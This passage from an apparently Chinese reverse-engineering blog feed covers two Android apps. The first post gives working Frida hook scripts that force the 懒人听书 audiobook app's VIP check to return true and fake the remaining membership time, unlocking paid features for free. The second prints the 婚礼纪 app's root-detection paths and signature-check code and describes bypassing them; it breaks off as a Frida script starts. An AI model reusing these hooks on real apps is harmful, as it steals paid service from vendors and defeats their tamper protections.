&#125;<br>            <span class="hljs-title function_">return</span> (<span class="hljs-built_in">String</span>[]) arrayList.<span class="hljs-property">toArray</span>(<span class="hljs-keyword">new </span><span class="hljs-class title_">String</span>[<span class="hljs-number">0</span>]);<br>        &#125;<br>        <span class="hljs-title function_">return</span> (<span class="hljs-built_in">String</span>[]) arrayList.<span class="hljs-property">toArray</span>(<span class="hljs-keyword">new </span><span class="hljs-class title_">String</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="附录2"><a href="#附录2" class="headerlink" title="附录2"></a>附录2</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs processing"><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkForRWPaths</span>() &#123;<br>    <span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span>;<br>    <span class="hljs-built_in">String</span> str2;<br>    <span class="hljs-built_in">String</span>[] strArr;<br>    <span class="hljs-built_in">String</span>[] mountReader = <span class="hljs-title function_">mountReader</span>();<br>    <span class="hljs-keyword">if</span> (mountReader == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> i2 = Build.<span class="hljs-property">VERSION</span>.<span class="hljs-property">SDK_INT</span>;<br>    <span class="hljs-type">int</span> length = mountReader.<span class="hljs-property">length</span>;<br>    <span class="hljs-type">int</span> i3 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">boolean</span> z2 = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">while</span> (i3 &lt; length) &#123;<br>        <span class="hljs-built_in">String</span> str3 = mountReader[i3];<br>        <span class="hljs-built_in">String</span>[] <span class="hljs-built_in">split</span> = str3.<span class="hljs-property">split</span>(<span class="hljs-string">&quot; &quot;</span>);<br>        <span class="hljs-type">int</span> i4 = <span class="hljs-number">23</span>;<br>        <span class="hljs-keyword">if</span> ((i2 &lt;= <span class="hljs-number">23</span> &amp;&amp; <span class="hljs-built_in">split</span>.<span class="hljs-property">length</span> &lt; <span class="hljs-number">4</span>) || (i2 &gt; <span class="hljs-number">23</span> &amp;&amp; <span class="hljs-built_in">split</span>.<span class="hljs-property">length</span> &lt; <span class="hljs-number">6</span>)) &#123;<br>            QLog.<span class="hljs-property">e</span>(<span class="hljs-string">&quot;Error formatting mount line: &quot;</span> + str3);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (i2 &gt; <span class="hljs-number">23</span>) &#123;<br>                <span class="hljs-built_in">str</span> = <span class="hljs-built_in">split</span>[<span class="hljs-number">2</span>];<br>                str2 = <span class="hljs-built_in">split</span>[<span class="hljs-number">5</span>];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">str</span> = <span class="hljs-built_in">split</span>[<span class="hljs-number">1</span>];<br>                str2 = <span class="hljs-built_in">split</span>[<span class="hljs-number">3</span>];<br>            &#125;<br>            <span class="hljs-built_in">String</span>[] strArr2 = Const.<span class="hljs-property">pathsThatShouldNotBeWritable</span>;<br>            <span class="hljs-type">int</span> length2 = strArr2.<span class="hljs-property">length</span>;<br>            <span class="hljs-type">int</span> i5 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (i5 &lt; length2) &#123;<br>                <span class="hljs-built_in">String</span> str4 = strArr2[i5];<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">str</span>.<span class="hljs-property">equalsIgnoreCase</span>(str4)) &#123;<br>                    <span class="hljs-keyword">if</span> (Build.<span class="hljs-property">VERSION</span>.<span class="hljs-property">SDK_INT</span> &gt; i4) &#123;<br>                        str2 = str2.<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                    &#125;<br>                    <span class="hljs-built_in">String</span>[] split2 = str2.<span class="hljs-property">split</span>(<span class="hljs-string">&quot;,&quot;</span>);<br>                    <span class="hljs-type">int</span> length3 = split2.<span class="hljs-property">length</span>;<br>                    <span class="hljs-type">int</span> i6 = <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">while</span> (i6 &lt; length3) &#123;<br>                        strArr = mountReader;<br>                        <span class="hljs-keyword">if</span> (split2[i6].<span class="hljs-property">equalsIgnoreCase</span>(<span class="hljs-string">&quot;rw&quot;</span>)) &#123;<br>                            QLog.<span class="hljs-property">v</span>(str4 + <span class="hljs-string">&quot; path is mounted with rw permissions! &quot;</span> + str3);<br>                            z2 = <span class="hljs-literal">true</span>;<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                        i6++;<br>                        mountReader = strArr;<br>                    &#125;<br>                &#125;<br>                strArr = mountReader;<br>                i5++;<br>                mountReader = strArr;<br>                i4 = <span class="hljs-number">23</span>;<br>            &#125;<br>        &#125;<br>        i3++;<br>        mountReader = mountReader;<br>    &#125;<br>    <span class="hljs-keyword">return</span> z2;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>apk逆向__懒人听书逆向</title>
    <link href="/2024/01/07/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98/"/>
    <url>/2024/01/07/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98/</url>
    
    <content type="html"><![CDATA[<h2 id="去会员之前"><a href="#去会员之前" class="headerlink" title="去会员之前"></a>去会员之前</h2><p><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105134717965.png"></p><p><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105134732958.png"></p><h2 id="关键词搜索"><a href="#关键词搜索" class="headerlink" title="关键词搜索"></a>关键词搜索</h2><p>搜索会员，看到AdverSwitchUtils()函数。<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105134600251.png"></p><h2 id="定位代码"><a href="#定位代码" class="headerlink" title="定位代码"></a>定位代码</h2><p>由于apk 的代码被混淆了，因此没办法通过函数名来分辨出对应的函数功能，但是可以通过函数的代码来判断。</p><p><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105000412289.png"></p><p>跳转到 bubei.tingshu.commonlib.account.a.Z()  函数内查看，可以看到会返回H()函数<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105000610668.png"></p><p>可以看到H 函数返回一个boolean类型的值，因此可以直接hook这个函数。还可以更改vipExpireTime 的值，以及vipType的值。</p><p><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105000709278.png"></p><h2 id="Frida-Hook绕过vip"><a href="#Frida-Hook绕过vip" class="headerlink" title="Frida Hook绕过vip"></a>Frida Hook绕过vip</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Author       : tigerHu</span><br><span class="hljs-string">Version      : V1.0</span><br><span class="hljs-string">Date         : 2023-12-21 20:36:52</span><br><span class="hljs-string">Description  : </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adb_forward</span>():<br>    os.system(<span class="hljs-string">&#x27;adb forward tcp:27042 tcp:27042&#x27;</span>)<br>    os.system(<span class="hljs-string">&#x27;adb forward tcp:27043 tcp:27043&#x27;</span>)<br><br><br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Java.perform(function()&#123; </span><br><span class="hljs-string">    let a = Java.use(&quot;bubei.tingshu.commonlib.account.a&quot;);</span><br><span class="hljs-string">a[&quot;H&quot;].implementation = function (i10, j5) &#123;</span><br><span class="hljs-string">    console.log(&#x27;H is called&#x27; + &#x27;, &#x27; + &#x27;i10: &#x27; + i10 + &#x27;, &#x27; + &#x27;j5: &#x27; + j5);</span><br><span class="hljs-string">    let ret = this.H(i10, j5);</span><br><span class="hljs-string">    console.log(&#x27;H ret value is &#x27; + ret);</span><br><span class="hljs-string">    return true;</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]  &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br>adb_forward()<br><span class="hljs-comment"># 查找远程设备并附加到目标进程</span><br><span class="hljs-comment"># frida.get_remote_device() 远程设备,模拟器</span><br><span class="hljs-comment"># frida.get_usb_device  获取usb 设备</span><br>process = frida.get_usb_device().attach(<span class="hljs-number">4603</span>)<br><span class="hljs-comment">#pid = device.spawn([&quot;com.android.chrome&quot;])</span><br><span class="hljs-comment">#session = device.attach(pid)</span><br><span class="hljs-comment">#device.resume(pid)</span><br><span class="hljs-comment"># 在目标进程里创建脚本</span><br>script = process.create_script(jscode)<br><span class="hljs-comment"># 注册消息回调</span><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Hook Start Running&#x27;</span>)<br><span class="hljs-comment"># 加载创建好的javascript 脚本</span><br>script.load()<br><span class="hljs-comment"># 读取系统输入</span><br>sys.stdin.read()<br></code></pre></td></tr></table></figure><h2 id="frida-hook会员剩余时间"><a href="#frida-hook会员剩余时间" class="headerlink" title="frida hook会员剩余时间"></a>frida hook会员剩余时间</h2><p>在会员页，看到还有0天后过期，看的难受，于是改一下吧。<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105155239316.png"></p><h4 id="尝试修改Shared-prefs-文件（失败）"><a href="#尝试修改Shared-prefs-文件（失败）" class="headerlink" title="尝试修改Shared_prefs 文件（失败）"></a>尝试修改Shared_prefs 文件（失败）</h4><p>根据字符串信息，可以 vip 过期时间 的设定的函数。<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105104801203.png"></p><p><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105104746161.png"></p><p>可以直接hook  i() 函数，hook 函数的两个参数。<br>继续往下看，可以看到 r() 函数的函数方法，猜测是获取SharePreferences 内的account_info的值。<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105140557133.png"></p><p>使用对应的busybox vi 打开，因为android内没有 vi 命令。<br>修改为如下<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105141757166.png"><br>猜测是每次登录的时候，会请求平台的账号信息，然后保存在 account_info<br>重新进入app，没有改变。<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105142302645.png"></p><h3 id="关键词搜索-1"><a href="#关键词搜索-1" class="headerlink" title="关键词搜索"></a>关键词搜索</h3><p>找到对应的字符串，<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105154447953.png"></p><p><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105154907098.png"></p><p>找到引用的函数，如果大于7天，那就显示”您已是会员“，如果小于7天，就显示还剩下几天<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105154631728.png"><br>找到这个 g() 函数，这个函数会根据传入的字符串获取SharePreferences内account_info.xml对应的值，直接hook这个函数。<br><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105154715493.png"></p><h3 id="HOOK-代码"><a href="#HOOK-代码" class="headerlink" title="HOOK 代码"></a>HOOK 代码</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">        Java.<span class="hljs-keyword">perform</span>(<span class="hljs-keyword">function</span>()&#123; <br>        let a = Java.use(&quot;bubei.tingshu.commonlib.account.a&quot;);<br>        a[&quot;g&quot;].implementation = <span class="hljs-keyword">function</span> (str, i10) &#123;<br>            console.log(<span class="hljs-string">&#x27;g is called&#x27;</span> + <span class="hljs-string">&#x27;, &#x27;</span> + <span class="hljs-string">&#x27;str: &#x27;</span> + str + <span class="hljs-string">&#x27;, &#x27;</span> + <span class="hljs-string">&#x27;i10: &#x27;</span> + i10);<br>            <span class="hljs-keyword">if</span>(str == &quot;timeRemaining&quot;)&#123;<br>                i10 = <span class="hljs-number">10</span>;<br>                console.log(&quot;get timeRemaining&quot; + i10);<br>                let ret = this.g(str, i10);<br>                console.log(<span class="hljs-string">&#x27;timeRemaining ret value is &#x27;</span> + ret);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                let ret = this.g(str, i10);<br>                console.log(<span class="hljs-string">&#x27;g ret value is &#x27;</span> + ret);<br>                <span class="hljs-keyword">return</span> ret;<br>            &#125;<br>        &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105155448985.png"></p><h2 id="去会员后"><a href="#去会员后" class="headerlink" title="去会员后"></a>去会员后</h2><p><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105134807119.png"></p><p><img src="/68__%E9%80%86%E5%90%91__%E6%87%92%E4%BA%BA%E5%90%AC%E4%B9%A6%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240105134819111.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>apk逆向__婚礼纪逆向</title>
    <link href="/2024/01/03/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP/"/>
    <url>/2024/01/03/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP/</url>
    
    <content type="html"><![CDATA[<p>婚礼纪在root环境中，会检测root，闪退，并且还有签名校验。</p><p>提示信息 ：当前运行环境有风险，请在安全的环境运行“婚礼纪“应用</p><p>婚礼纪app 版本： 9.5.3</p><p>查壳：</p><p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240102232516234.png"></p><h2 id="定位闪退点"><a href="#定位闪退点" class="headerlink" title="定位闪退点"></a>定位闪退点</h2><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>文本搜索，并没搜索到，不知道咋回事。<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240102233418031.png"></p><h3 id="算法助手拦截"><a href="#算法助手拦截" class="headerlink" title="算法助手拦截"></a>算法助手拦截</h3><p>拦截方法：</p><ul><li>LSPPosed 应用启用算法助手模块 应用于 婚礼纪app</li><li>算法助手 应用 点击 log捕获，监听，防止闪退等记录。</li></ul><p>确定app 应用结束进程的堆栈在 “me.suncloud.marrymemo.view.SplashActivity.onCreate “ 内。<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240102234243709.png"></p><h2 id="jadx-分析"><a href="#jadx-分析" class="headerlink" title="jadx 分析"></a>jadx 分析</h2><h3 id="定位root检测点"><a href="#定位root检测点" class="headerlink" title="定位root检测点"></a>定位root检测点</h3><p>直接找到 me.suncloud.marrymemo.view.SplashActivity.onCreate 函数。</p><p>根据代码，可以看到在 line 93 有一个判断 ZGRootChecker.isDeviceRooted() 来检测当前root 环境。另外在 line 88 还会检测app 签名，如果后期修改smail 代码，可以绕过这些判断校验。如果不通这些校验，就会调用 finish() 函数终止进程。</p><p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240102233919727.png"></p><h3 id="root检测代码"><a href="#root检测代码" class="headerlink" title="root检测代码"></a>root检测代码</h3><p>根据上面的分析， ZGRootChecker.isDeviceRooted() 这个函数会检测当前设备root 权限，检测代码如下所示：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">/* loaded from: classes16.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZGRootChecker</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isDeviceRooted</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">checkRootMethod1</span>() || <span class="hljs-title function_">checkRootMethod2</span>() || <span class="hljs-title function_">checkRootMethod3</span>();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">checkRootMethod1</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">String</span> str = <span class="hljs-title class_">Build</span>.<span class="hljs-property">TAGS</span>;<br>        <span class="hljs-keyword">return</span> str != <span class="hljs-literal">null</span> &amp;&amp; str.<span class="hljs-title function_">contains</span>(<span class="hljs-string">&quot;test-keys&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">checkRootMethod2</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">String</span>[] strArr = &#123;<span class="hljs-string">&quot;/system/app/Superuser.apk&quot;</span>, <span class="hljs-string">&quot;/sbin/su&quot;</span>, <span class="hljs-string">&quot;/system/bin/su&quot;</span>, <span class="hljs-string">&quot;/system/xbin/su&quot;</span>, <span class="hljs-string">&quot;/data/local/xbin/su&quot;</span>, <span class="hljs-string">&quot;/data/local/bin/su&quot;</span>, <span class="hljs-string">&quot;/system/sd/xbin/su&quot;</span>, <span class="hljs-string">&quot;/system/bin/failsafe/su&quot;</span>, <span class="hljs-string">&quot;/data/local/su&quot;</span>, <span class="hljs-string">&quot;/su/bin/su&quot;</span>&#125;;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(strArr[i]).<span class="hljs-title function_">exists</span>()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">checkRootMethod3</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-built_in">boolean</span> z = <span class="hljs-literal">false</span>;<br>        <span class="hljs-title class_">Process</span> process = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            process = <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/system/xbin/which&quot;</span>, <span class="hljs-string">&quot;su&quot;</span>&#125;);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.<span class="hljs-title function_">getInputStream</span>())).<span class="hljs-title function_">readLine</span>() != <span class="hljs-literal">null</span>) &#123;<br>                z = <span class="hljs-literal">true</span>;<br>            &#125;<br>            process.<span class="hljs-title function_">destroy</span>();<br>            <span class="hljs-keyword">return</span> z;<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Throwable</span> unused) &#123;<br>            <span class="hljs-keyword">if</span> (process != <span class="hljs-literal">null</span>) &#123;<br>                process.<span class="hljs-title function_">destroy</span>();<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="签名校验"><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h3><p>ZGSafetyMonitor.checkSHA1(this, getString(R.string.certificate_sha1)) 判断，代码很简单，计算SHA 的值，然后进行匹配。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><br><span class="hljs-comment">/* loaded from: classes16.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZGSafetyMonitor</span> &#123;<br>    <span class="hljs-keyword">public</span> static boolean checkSHA1(Context context, String sha1) &#123;<br>        <span class="hljs-keyword">return</span> new ZGSignatureChecker(context, sha1).checkSHA1();<br>    &#125;<br>    <span class="hljs-keyword">public</span> static boolean checkMD5(Context context, String md5) &#123;<br>        <span class="hljs-keyword">return</span> new ZGSignatureChecker(context, md5).checkMD5();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ZGSignatureChecker</span><br><br>    <span class="hljs-keyword">public</span> boolean checkSHA1() &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.realCer != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">this</span>.cer = CommonUtil.getMD5(getCertificateSHA1Fingerprint().trim());<br>            String trim = <span class="hljs-keyword">this</span>.realCer.trim(); <br>            <span class="hljs-keyword">this</span>.realCer = trim; <br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.cer.equals(trim);  <br>        &#125; <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> boolean checkMD5() &#123;  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.realCer != <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">this</span>.cer = CommonUtil.getMD5(getCertificateMD5Fingerprint().trim());  <br>            String trim = <span class="hljs-keyword">this</span>.realCer.trim();  <br>            <span class="hljs-keyword">this</span>.realCer = trim;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.cer.equals(trim);  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="绕过root检测"><a href="#绕过root检测" class="headerlink" title="绕过root检测"></a>绕过root检测</h2><h3 id="frida-hook"><a href="#frida-hook" class="headerlink" title="frida hook"></a>frida hook</h3><p>从jadx内转出frida脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 